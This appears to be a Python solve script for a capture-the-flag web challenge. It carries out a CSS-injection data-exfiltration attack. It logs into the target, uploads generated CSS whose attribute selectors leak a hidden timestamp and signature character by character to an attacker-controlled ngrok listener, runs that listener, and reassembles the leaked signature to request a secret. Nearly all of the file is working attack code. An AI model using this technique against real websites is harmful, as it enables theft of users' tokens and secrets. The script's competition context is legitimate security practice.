#!/usr/bin/env python3

import aiohttp
import asyncio
import copy
import string
import time

from dataclasses import (
    dataclass)
from io import (
    StringIO)
from typing import (
    Set)

from aiohttp import (
    web)

TARGET_URL = 'https://ugly-website.web.jctf.pro'
LISTEN_URL = 'https://67b9b834.ngrok.io'

ALPHABET = string.digits + 'abcdef'
LOCAL_LISTEN_PORT = 5000

USER = 'brian'
PASSWORD = 'password'
TARGET_UID = 1

SGN_LEN = 64
KB = 1000


@dataclass
class SolveContext:
    timestamp: str
    sgn_start: str
    sgn_triples: Set[str]

solve_ctx = SolveContext('', '', set())


#
# CLIENT-SIDE
#

async def _combine_helper(curr_sgn, triples):
    """Super inefficient."""
    if not triples:
        async with aiohttp.ClientSession() as sess:
            sgn_url = f'{TARGET_URL}/api/secret'
            sgn_url += f'?sgn={curr_sgn}'
            sgn_url += f'&timestamp={solve_ctx.timestamp}'
            sgn_url += f'&uid={TARGET_UID}'
            print('SENDING REQUEST TO', sgn_url)

            resp = await sess.get(sgn_url)
            print('FLAG?', await resp.text())

    for i in range(len(triples)):
        triple = triples[i]

        if triple[:2] == curr_sgn[-2:]:
            curr_sgn += triple[-1]
            print('SGN:', curr_sgn)
            print('TRIPLES:', triples)
            pruned_triples = copy.copy(triples)
            pruned_triples.pop(i)
            await _combine_helper(curr_sgn, pruned_triples)


async def combine_triples():
    print('STARTING TRIPLES COMBINATION BRUTEFORCE')
    await _combine_helper(solve_ctx.sgn_start, list(solve_ctx.sgn_triples))


async def maybe_solve():
    if not solve_ctx.timestamp:
        print('FAILED TIMESTAMP CHECK')
        return
    elif not solve_ctx.sgn_start:
        print('FAILED SGN_START CHECK')
        return
    elif len(solve_ctx.sgn_triples) != SGN_LEN - len(solve_ctx.sgn_start):
        return

    await combine_triples()


def css_line(text, new_line=True):
    lines = text.splitlines()
    lines = [line.strip() for line in lines if line.strip()]
    css = ''.join(lines)
    return css if not new_line else f'{css}\n'


def make_css():
    css = ''

    # add timestamp-leaking rules
    epoch_now = int(time.time())
    for i in range(epoch_now, epoch_now + 30):
        css += css_line(f"""\
            input.timestamp[value="{i}"]~button{{
                background:url({LISTEN_URL}/t/{i});
            }}""")

    # add sgn-start-leaking rules
    for i in range(len(ALPHABET)**2):
        css += css_line(f"""\
            input.sgn[value^="{i:02x}"]~button{{
                content:url({LISTEN_URL}/s/{i:02x});
            }}""")

    # add sgn-body-leaking rules
    for i in range(len(ALPHABET)**3):
        css += css_line(f"""\
            input.sgn[value*="{i:03x}"]~button{{
                --p{i}:url({LISTEN_URL}/e/{i:03x});
            }}""")

    # add animation frames
    css += css_line("""\
        button{
            animation:aa 28s 1s;
        }""")

    NUM_FRAMES = len(ALPHABET)**3 // 4
    css += '@keyframes aa{'
    for i in range(NUM_FRAMES):
        css += css_line(f"""\
            {i*0.08:.2f}%{{
                content:var(--p{i});
                list-style-image:var(--p{i+NUM_FRAMES});
                border-image:var(--p{i+NUM_FRAMES*2});
                background-image:var(--p{i+NUM_FRAMES*3});
            }}""")
    css += '}'

    assert len(css) < 500 * KB, 'CSS too big'
    return css


async def upload_css():
    async with aiohttp.ClientSession() as sess:
        resp = await sess.post(f'{TARGET_URL}/login',
                               data=dict(user=USER, password=PASSWORD))
        print('LOGIN:', resp.status)

        css = make_css()
        files = dict(file=StringIO(css))
        resp = await sess.post(f'{TARGET_URL}/upload_css', data=files)
        print('CSS UPLOAD:', resp.status)


#
# SERVER SIDE
#

async def start_handler(request):
    global solve_ctx

    sgn_start = request.match_info.get('hex_double')
    solve_ctx.sgn_start = sgn_start
    print('GOT SGN START:', sgn_start)

    return web.Response(text='whatever')


async def time_handler(request):
    global solve_ctx

    timestamp = request.match_info.get('time')
    solve_ctx.timestamp = timestamp
    print('GOT TIME:', timestamp)

    return web.Response(text='whatever')


async def exfil_handler(request):
    global solve_ctx

    sgn_triple = request.match_info.get('hex_triple')
    solve_ctx.sgn_triples.add(sgn_triple)
    print('GOT SGN TRIPLE:', sgn_triple)
    print('NUMBER SGN TRIPLES:', len(solve_ctx.sgn_triples))

    await maybe_solve()
    return web.Response(text='whatever')


def init_routes(app):
    app.add_routes([
        web.get('/e/{hex_triple}', exfil_handler),
        web.get('/s/{hex_double}', start_handler),
        web.get('/t/{time}', time_handler),
    ])


if __name__ == '__main__':
    app = web.Application()
    init_routes(app)

    asyncio.ensure_future(upload_css())
    web.run_app(app, port=LOCAL_LISTEN_PORT)
